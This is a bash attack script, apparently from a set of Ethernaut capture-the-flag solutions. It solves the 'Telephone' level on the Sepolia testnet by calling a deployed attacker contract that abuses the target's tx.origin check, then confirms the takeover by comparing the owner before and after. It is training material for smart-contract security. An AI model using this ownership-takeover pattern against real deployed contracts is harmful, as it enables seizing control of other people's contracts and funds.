#!/bin/bash
# script/levels/04_Telephone/attack.sh
# Telephone Attack Script - Exploit tx.origin vulnerability
#
# Usage:
#   bash script/levels/04_Telephone/attack.sh <ATTACKER_ADDRESS> 
#
# Example:
#   bash script/levels/04_Telephone/attack.sh 0x1234567890123456789012345678901234567890
#
# Requirements:
#   - .env file with SEPOLIA_RPC_URL and PRIVATE_KEY
#   - Attacker contract deployed (0x8a04aB9132AdeAA56Ce264bad7BA2DaeEaB8A4aE)
#   - Target at TELEPHONE_TARGET in .env

set -e

if [ ! -f .env ]; then
    echo "❌ Error: .env file not found"
    exit 1
fi

source .env

ATTACKER_ADDRESS="${1}"
TARGET_ADDRESS="${TELEPHONE_TARGET}"

if [ -z "$ATTACKER_ADDRESS" ]; then
    echo "❌ Error: Attacker address required"
    echo "Usage: bash script/levels/04_Telephone/attack.sh <ATTACKER_ADDRESS>"
    exit 1
fi

if [ -z "$TARGET_ADDRESS" ]; then
    echo "❌ Error: TELEPHONE_TARGET not set in .env"
    exit 1
fi

echo "╔════════════════════════════════════════════════════════╗"
echo "║          Telephone CTF - Attack Script                ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
echo "Attacker: $ATTACKER_ADDRESS"
echo "Target:   $TARGET_ADDRESS"
echo ""

# Get your wallet address
YOUR_WALLET=$(cast wallet address --private-key "$PRIVATE_KEY")
echo "Your Wallet: $YOUR_WALLET"
echo ""

# Check initial owner
INITIAL_OWNER=$(cast call "$TARGET_ADDRESS" "owner()" --rpc-url "$SEPOLIA_RPC_URL")
echo "Initial Owner: $INITIAL_OWNER"
echo ""

# Execute attack
echo "🚀 Executing attack()..."
cast send "$ATTACKER_ADDRESS" \
    "attack(address)" "$YOUR_WALLET" \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --private-key "$PRIVATE_KEY"

echo ""
echo "⏳ Waiting for block confirmation..."
sleep 5

# Verify owner changed
FINAL_OWNER=$(cast call "$TARGET_ADDRESS" "owner()" --rpc-url "$SEPOLIA_RPC_URL")
echo "Final Owner: $FINAL_OWNER"
echo ""

if [ "$FINAL_OWNER" = "$YOUR_WALLET" ]; then
    echo "╔════════════════════════════════════════════════════════╗"
    echo "║              ✅ ATTACK SUCCESSFUL! ✅                  ║"
    echo "╚════════════════════════════════════════════════════════╝"
    echo ""
    echo "✅ Next step: Submit instance on https://ethernaut.openzeppelin.com/level/4"
else
    echo "❌ Attack failed - owner did not change"
fi
